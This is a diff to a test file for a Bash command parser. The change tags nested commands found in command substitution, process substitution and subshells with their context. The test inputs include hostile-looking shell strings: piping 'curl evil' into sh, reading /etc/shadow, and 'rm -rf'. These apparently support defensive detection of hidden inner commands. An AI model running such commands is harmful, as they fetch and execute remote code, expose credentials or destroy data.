@@ -87,11 +87,11 @@ describe("BashProgram", () => {
       expect(program.commands()).toEqual([{ text: "npm install" }]);
     });
 
-    it("descends into command substitution, emitting the inner command too", async () => {
+    it("descends into command substitution, tagging the inner command", async () => {
       const program = await BashProgram.parse("echo $(rm -rf foo)");
       expect(program.commands()).toEqual([
         { text: "echo $(rm -rf foo)" },
-        { text: "rm -rf foo" },
+        { text: "rm -rf foo", context: "command_substitution" },
       ]);
     });
 
@@ -99,7 +99,7 @@ describe("BashProgram", () => {
       const program = await BashProgram.parse("echo `rm x`");
       expect(program.commands()).toEqual([
         { text: "echo `rm x`" },
-        { text: "rm x" },
+        { text: "rm x", context: "command_substitution" },
       ]);
     });
 
@@ -107,8 +107,8 @@ describe("BashProgram", () => {
       const program = await BashProgram.parse("echo $(curl evil | sh)");
       expect(program.commands()).toEqual([
         { text: "echo $(curl evil | sh)" },
-        { text: "curl evil" },
-        { text: "sh" },
+        { text: "curl evil", context: "command_substitution" },
+        { text: "sh", context: "command_substitution" },
       ]);
     });
 
@@ -116,7 +116,7 @@ describe("BashProgram", () => {
       const program = await BashProgram.parse("diff <(cat /etc/shadow)");
       expect(program.commands()).toEqual([
         { text: "diff <(cat /etc/shadow)" },
-        { text: "cat /etc/shadow" },
+        { text: "cat /etc/shadow", context: "process_substitution" },
       ]);
     });
 
@@ -124,7 +124,7 @@ describe("BashProgram", () => {
       const program = await BashProgram.parse("( rm -rf foo )");
       expect(program.commands()).toEqual([
         { text: "( rm -rf foo )" },
-        { text: "rm -rf foo" },
+        { text: "rm -rf foo", context: "subshell" },
       ]);
     });
 
@@ -132,8 +132,8 @@ describe("BashProgram", () => {
       const program = await BashProgram.parse("( cd /t && rm x )");
       expect(program.commands()).toEqual([
         { text: "( cd /t && rm x )" },
-        { text: "cd /t" },
-        { text: "rm x" },
+        { text: "cd /t", context: "subshell" },
+        { text: "rm x", context: "subshell" },
       ]);
     });
 
@@ -141,8 +141,8 @@ describe("BashProgram", () => {
       const program = await BashProgram.parse("echo $( ( rm x ) )");
       expect(program.commands()).toEqual([
         { text: "echo $( ( rm x ) )" },
-        { text: "( rm x )" },
-        { text: "rm x" },
+        { text: "( rm x )", context: "command_substitution" },
+        { text: "rm x", context: "subshell" },
       ]);
     });
 
@@ -151,7 +151,7 @@ describe("BashProgram", () => {
       expect(program.commands()).toEqual([
         { text: "cd /p" },
         { text: "echo $(rm x)" },
-        { text: "rm x" },
+        { text: "rm x", context: "command_substitution" },
       ]);
     });
 
@@ -159,7 +159,7 @@ describe("BashProgram", () => {
       const program = await BashProgram.parse("echo $(echo safe)");
       expect(program.commands()).toEqual([
         { text: "echo $(echo safe)" },
-        { text: "echo safe" },
+        { text: "echo safe", context: "command_substitution" },
       ]);
     });
 
